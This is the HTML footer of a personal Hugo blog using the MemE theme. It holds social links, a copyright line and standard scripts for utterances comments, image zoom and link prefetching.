                    <a href="mailto:myz.xcg@gmail.com" target="_blank" rel="external noopener" title="Email"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"/></svg></a>
                </li><li class="socials-item">
                    <a href="/rss.xml" target="_blank" rel="external noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415c1.814 0 3.293 1.479 3.293 3.295 0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526 0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727 0 15.909 7.184 15.909 15.91z"/></svg></a>
                </li></ul>
    


            <div class="site-info">©&nbsp;2022&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
              </div>

            
        </div>
    </footer>


        </div>
        

        






    

        

        

        
            <script>
    function loadComments() {
        (function() {
            var utterances = document.getElementById("utterances");
            var script = document.createElement('script');
            script.src = 'https://utteranc.es/client.js';
            script.async = true;
            script.crossOrigin = 'anonymous';
            script.setAttribute('repo', 'myzxcg\/myzxcg.github.io');
            script.setAttribute('issue-term', 'title');
            const isDark = getCurrentTheme() === 'dark';
        if (isDark) {
            script.setAttribute('theme', 'photon-dark');
        } else {
            script.setAttribute('theme', 'github-light');
        }
            
            utterances.appendChild(script);
        })();
    }
</script>
        

        

    



    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>

<script>
    let imgNodes = document.querySelectorAll('div.post-body img');
    imgNodes = Array.from(imgNodes).filter(node => node.parentNode.tagName !== "A");

    mediumZoom(imgNodes, {
        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
    })
</script>




    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>







    </body>
</html>
